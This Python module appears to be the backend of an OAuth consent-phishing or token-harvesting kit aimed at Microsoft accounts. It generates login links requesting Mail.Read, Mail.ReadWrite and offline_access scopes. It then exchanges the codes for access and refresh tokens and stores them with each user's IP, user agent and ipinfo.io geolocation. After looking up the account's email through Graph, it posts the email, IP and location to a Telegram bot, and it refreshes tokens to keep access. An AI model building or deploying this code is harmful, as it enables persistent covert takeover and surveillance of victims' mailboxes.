from db import SessionLocal, init_db  # ✅ UPDATED
from models import TenantToken
from datetime import datetime, timedelta
from urllib.parse import urlencode, quote_plus, unquote  # ✅ UPDATED
import requests
import os
import uuid

# =========================
# CONFIG
# =========================
CLIENT_ID = "3d3d5a12-09a4-4163-bab2-0188bf65ddd1"
CLIENT_SECRET = os.environ.get("CLIENT_SECRET")
REDIRECT_URI = "https://oauth-backend-7cuu.onrender.com/auth/callback"
TOKEN_URL = "https://login.microsoftonline.com/common/oauth2/v2.0/token"

TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID")


# =========================
# TOKEN STORAGE (UPDATED WITH DEVICE INFO)
# =========================
def save_token(user_id, session_id, token_data, device_info=None):
    db = SessionLocal()

    expires_at = int(
        (datetime.utcnow() + timedelta(seconds=token_data["expires_in"])).timestamp()
    )

    existing = db.query(TenantToken).filter_by(
        tenant_id=user_id,
        session_id=session_id
    ).first()

    if existing:
        existing.access_token = token_data["access_token"]
        existing.refresh_token = token_data.get("refresh_token") or existing.refresh_token
        existing.expires_at = expires_at

        if device_info:
            existing.ip_address = device_info.get("ip")
            existing.user_agent = device_info.get("agent")
            existing.location = device_info.get("location")

    else:
        db.add(TenantToken(
            tenant_id=user_id,
            session_id=session_id,
            access_token=token_data["access_token"],
            refresh_token=token_data.get("refresh_token"),
            expires_at=expires_at,
            ip_address=device_info.get("ip") if device_info else None,
            user_agent=device_info.get("agent") if device_info else None,
            location=device_info.get("location") if device_info else None
        ))

    db.commit()
    db.close()


def get_token(user_id, session_id=None):
    db = SessionLocal()

    query = db.query(TenantToken).filter_by(tenant_id=user_id)

    if session_id:
        query = query.filter_by(session_id=session_id)

    token = query.first()
    db.close()
    return token


# =========================
# LOGIN LINK GENERATION
# =========================
def generate_login_link(user_id_or_tenant: str):
    base_url = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize"

    session_id = str(uuid.uuid4())
    state_value = f"{user_id_or_tenant}:{session_id}"

    params = {
        "client_id": CLIENT_ID,
        "response_type": "code",
        "redirect_uri": REDIRECT_URI,
        "response_mode": "query",
        "scope": "User.Read Mail.Read Mail.ReadWrite offline_access",
        "state": quote_plus(state_value)
    }

    return f"{base_url}?{urlencode(params)}"


# =========================
# TELEGRAM ALERT
# =========================
def send_telegram_alert(message: str):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": TELEGRAM_CHAT_ID, "text": message}
    try:
        requests.post(url, data=payload)
    except Exception as e:
        print(f"Failed to send Telegram alert: {e}")


# =========================
# TOKEN EXCHANGE (FIXED)
# =========================
def exchange_code_for_token(code: str, state: str, client_ip: str = None, user_agent: str = None):

    init_db()  # ✅ FIX 1: ensure table exists

    state = unquote(state)  # ✅ FIX 2: decode URL-encoded state

    if ":" in state:
        user_id, session_id = state.split(":")
    else:
        user_id = state
        session_id = "default"

    data = {
        "client_id": CLIENT_ID,
        "scope": "User.Read Mail.Read Mail.ReadWrite offline_access",
        "code": code,
        "redirect_uri": REDIRECT_URI,
        "grant_type": "authorization_code",
        "client_secret": CLIENT_SECRET
    }

    response = requests.post(TOKEN_URL, data=data)
    result = response.json()

    if "error" in result:
        raise Exception(f"Token exchange failed: {result['error_description']}")

    location_str = "unknown"
    if client_ip:
        try:
            loc_resp = requests.get(f"https://ipinfo.io/{client_ip}/json")
            if loc_resp.ok:
                loc = loc_resp.json()
                location_str = f"{loc.get('city')}, {loc.get('region')}, {loc.get('country')}"
        except:
            pass

    device_info = {
        "ip": client_ip,
        "agent": user_agent,
        "location": location_str
    }

    save_token(user_id, session_id, result, device_info)

    headers = {"Authorization": f"Bearer {result['access_token']}"}
    try:
        graph_resp = requests.get("https://graph.microsoft.com/v1.0/me", headers=headers)
        email = graph_resp.json().get("userPrincipalName", "unknown")
    except:
        email = "unknown"

    message = (
        f"User ID: {user_id}\n"
        f"Session ID: {session_id}\n"
        f"Email: {email}\n"
        f"IP: {client_ip or 'unknown'}\n"
        f"Location: {location_str}"
    )

    send_telegram_alert(message)

    return result


# =========================
# TOKEN REFRESH
# =========================
def refresh_token(user_id: str, session_id: str = None):
    token_record = get_token(user_id, session_id)

    if not token_record or not token_record.refresh_token:
        raise Exception("No refresh token available. User must re-login.")

    data = {
        "client_id": CLIENT_ID,
        "scope": "User.Read Mail.Read Mail.ReadWrite offline_access",
        "refresh_token": token_record.refresh_token,
        "grant_type": "refresh_token",
        "client_secret": CLIENT_SECRET
    }

    response = requests.post(TOKEN_URL, data=data)
    result = response.json()

    if "error" in result:
        raise Exception(f"Token refresh failed: {result['error_description']}")

    save_token(user_id, token_record.session_id, result)
    return result
